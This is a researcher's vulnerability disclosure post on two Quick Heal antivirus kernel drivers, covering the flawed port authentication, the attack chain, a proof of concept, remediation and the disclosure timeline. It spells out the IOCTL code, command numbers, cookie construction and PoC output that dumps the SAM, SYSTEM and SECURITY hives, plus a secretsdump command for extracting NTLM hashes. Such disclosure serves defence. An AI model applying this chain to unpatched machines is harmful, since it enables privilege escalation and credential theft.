---
layout: post
title: Quick Heal Self Protection Bypass Vulnerability
date: 2026-05-20 20:05:10
---

## Overview

Quick Heal is one of India's most widely deployed antivirus products, used across millions of consumer and enterprise endpoints. This post documents a chain of vulnerabilities I found in two of its kernel drivers — `ggc.sys` and `catflt.sys` — that allow a standard non-privileged Windows user to completely bypass the product's self-protection mechanism and gain unrestricted read, write, delete, and rename access to any file on the system.

The most severe consequence: a non-admin user can dump the Windows SAM, SYSTEM, and SECURITY registry hives — the files containing every local user's NTLM password hash — without triggering any alert from the very product designed to prevent this.

No administrator privileges. No UAC bypass. No user interaction. Entirely user-mode code.



## Affected Components

Quick Heal's kernel-mode protection relies on two filter drivers that communicate with user-mode processes via Filter Communication Ports:

| Driver | Port | Purpose |
|---|---|---|
| `ggc.sys` | `\GGCMessagePort` | Core protection driver. Manages process trust decisions via IOCTL-based trust verification. |
| `catflt.sys` | `\CatfltEventCommPort` | Catalog filter driver. Exposes privileged kernel file system operations to trusted callers. |

The intended design is that only Quick Heal's own service process (`arwsrvc.exe`) can connect to these ports. In practice, any process can.



## Vulnerability 1: Authentication Bypass in GGCMessagePort (ggc.sys)

### The Authentication Mechanism

`GGCMessagePort` uses an XOR-encrypted cookie to authenticate callers. The cookie structure is:

```c
cookie.magic   = 0x43534851  // 'QHSC'
cookie.version = 17
cookie.pid     = GetCurrentProcessId()
cookie.tid     = GetCurrentThreadId()
XorCookie(cookie, 32, pid)   // XOR encrypt with own PID as key
```

### The Flaw

The encryption key is the caller's own PID. The authentication check verifies that the decrypted cookie contains the caller's own PID. Since every process knows its own PID, every process can construct a perfectly valid authentication cookie.

This is circular authentication — the secret is the value being verified. It provides no access control whatsoever.

### Impact

Once connected to `\GGCMessagePort`, an attacker sends two commands via IOCTL `0x222544` to globally disable Quick Heal's kernel-level trust verification:

- **Command 1:** Sets `glob_1 = 0` — disables the ggc trust check globally
- **Command 8:** Sets `glob_2 = 1` — secondary bypass flag

After these two commands, every subsequent trust check performed by the Quick Heal drivers returns "trusted" for any process.

The trust verification function in the driver (`sub_FFFFF802A3E5DCA8`) walks an internal process list and verifies trust state via two global flags. Setting both flags puts the driver into a state where all callers are considered trusted:

```c
bool __fastcall sub_FFFFF802A3E5DCA8(unsigned __int64 a1)
{
    // ...
    if ( KeGetCurrentIrql() > 1u || !byte_FFFFF802A3E6C310 
         || byte_FFFFF802A3E6C78A == 1 )
        return 1;  // trust check disabled globally
    // ...
}
```



## Vulnerability 2: Privileged File System Access via CatfltEventCommPort (catflt.sys)

### NULL DACL on the Communication Port

`CatfltEventCommPort` is created with a NULL DACL:

```c
RtlSetDaclSecurityDescriptor(SecurityDescriptor, 1u, 0i64, 0);
// NULL DACL = everyone has full access
FltCreateCommunicationPort(..., MaxConnections: 4096);
```

A NULL DACL grants full access to everyone. Any process can connect to this port. The only intended barrier was the ggc trust check — which we already bypassed.

### Privileged Operations Exposed

Once connected, the port's `MessageNotifyCallback` handler exposes kernel-level file system operations directly to user-mode:

| Command | Operation | Kernel API |
|---|---|---|
| 25 | Arbitrary file read | `FltReadFile` |
| 26 | Arbitrary file write | `FltWriteFile` |
| 27 | Arbitrary file delete | `FltCreateFile` + `FILE_DELETE_ON_CLOSE` |
| 28 | Arbitrary file rename | `FltSetInformationFile(FileRenameInformation)` |
| 32 | Kernel file open → usermode handle | `FltCreateFile` + `ZwDuplicateObject` from SYSTEM |

**Command 32 is the most powerful.** It opens any file using `FltCreateFile` with kernel privileges, then duplicates the handle from the SYSTEM process into the caller's process using `ZwDuplicateObject`. The returned handle bypasses all ACL checks and can be used with standard Win32 `ReadFile`/`WriteFile` APIs from a non-privileged process.



## Attack Chain

The full exploit requires six steps, all executable from a standard non-elevated command prompt:

```
1. Connect to \GGCMessagePort
   └── Construct XOR cookie using own PID as key
   └── Any process can do this

2. Send Command 1 via IOCTL 0x222544
   └── Sets glob_1 = 0
   └── Disables ggc trust check globally

3. Send Command 8 via IOCTL 0x222544
   └── Sets glob_2 = 1
   └── Secondary bypass complete

4. Connect to \CatfltEventCommPort
   └── NULL DACL — anyone can connect
   └── Trust check passes (we just disabled it)

5. Send Command 32 with target file path
   └── Driver opens file with FltCreateFile (kernel context, no ACL checks)
   └── ZwDuplicateObject copies handle from SYSTEM process to our process

6. Call ReadFile() on returned handle
   └── Read any file including SAM, SYSTEM, SECURITY
```



## Proof of Concept

Running `poc.exe` as a standard non-admin user on a clean Windows 11 installation with Quick Heal AntiVirus Pro installed:

```
C:\Users\test\Desktop> poc.exe
Quick Heal Driver Privilege Escalation PoC
Affected: ggc.sys + catflt.sys v24.0.0.21
Impact: Non-admin arbitrary file read/delete

[*] Running as: non-admin  PID: 16628

[*] Step 1: Bypassing GGC trust check...
[+] Connected to GGCMessagePort
[+] Trust check bypassed

[*] Step 2: Connecting to CatfltEventCommPort...
[+] Connected to CatfltEventCommPort

[*] Step 3: Reading SAM database (normally requires SYSTEM)...
[+] sam_dump.bin: 65536 bytes saved

[*] Step 4: Reading SYSTEM hive...
[+] system_dump.bin: 13107200 bytes saved

[*] Step 5: Reading SECURITY hive...
[+] security_dump.bin: 65536 bytes saved

[*] Restoring ggc protection...
[+] Done. Files saved: sam_dump.bin, system_dump.bin, security_dump.bin
```

The three dumped files can then be processed with standard tools to extract all local NTLM hashes:

```
impacket-secretsdump -sam sam_dump.bin -system system_dump.bin -security security_dump.bin LOCAL
```



## Impact

### Credential Theft
The SAM, SYSTEM, and SECURITY hives contain every local user's NTLM password hash. These can be cracked offline or used directly in pass-the-hash attacks to gain administrator access — all from a standard user account.

### Arbitrary File Read
Any file on the system regardless of ACLs, including files locked by other processes, files protected by mandatory integrity controls, Windows credential stores, certificate private keys, and Quick Heal's own configuration files.

### Arbitrary File Write, Delete, Rename
The exposed commands allow an attacker to overwrite system binaries, delete audit logs, or rename files to facilitate DLL hijacking against privileged processes.

### Self-Protection Bypass
Quick Heal's kernel-level trust mechanism is completely disabled for the duration of the attack, rendering all process-based protection ineffective.



## Root Cause

Three independent design flaws combine to create this vulnerability chain:

**1. Circular authentication in GGCMessagePort**  
Using the caller's own PID as both the XOR encryption key and the verified value means any process can authenticate. A correct implementation would use a shared secret established at driver load time, unknown to user-mode callers.

**2. NULL DACL on CatfltEventCommPort**  
The port should have a restrictive DACL limiting connections to Quick Heal's service account (`NT AUTHORITY\SYSTEM` or a dedicated service SID). Relying solely on the ggc trust check as the access control boundary is insufficient given how easily it can be bypassed.

**3. Privileged kernel operations exposed without layered authorization**  
`FltCreateFile`, `FltReadFile`, and `ZwDuplicateObject` operating in kernel context should not be reachable from user-mode via a communication port with no secondary authorization. Defense in depth requires that privileged operations verify caller identity independently of a single bypassable trust flag.



## Remediation

Quick Heal released a patch on **April 28, 2026** addressing these issues. The fix was delivered via the standard product and driver update mechanism.

Users running Quick Heal AntiVirus Pro or Total Security should verify they are on the latest version. The affected driver version is `24.0.0.21` — check your installed driver version via Device Manager or:

```
Get-WmiObject Win32_SystemDriver | Where-Object {$_.Name -like "*ggc*" -or $_.Name -like "*catflt*"} | Select Name, Version
```

Recommended remediation for the underlying issues:
- Replace PID-based cookie authentication with a cryptographic challenge-response mechanism using a secret established at driver load time
- Apply a restrictive DACL to `CatfltEventCommPort` limiting connections to Quick Heal's service account
- Add secondary authorization checks in `MessageNotifyCallback` that verify caller identity independently of the ggc trust mechanism
- Audit all filter communication port handlers for privileged operations accessible to untrusted callers



## Disclosure Timeline

| Date | Event |
|---|---|
| March 17, 2026 | Vulnerability reported to Quick Heal security team |
| March 31, 2026 | Quick Heal acknowledged receipt |
| April 15, 2026 | Follow-up sent requesting triage status |
| April 16, 2026 | Quick Heal confirmed report under review |
| April 28, 2026 | Patch released to customers |
| May 2026 | Quick Heal confirmed fix and notified reporter |
| May 2026 | Public disclosure |



## References

- Quick Heal Vulnerability Rewards Program: http://dlupdate.quickheal.com/documents/company_policies/Vulnerability_Rewards_Program.pdf
- FltCreateCommunicationPort (Microsoft Docs)
- ZwDuplicateObject (Microsoft Docs)
- CVE pending assignment



*Hrishikesh Pankaj — Security Researcher*  
*hrishikeshpankaj12@gmail.com | pwn-solo.github.io*
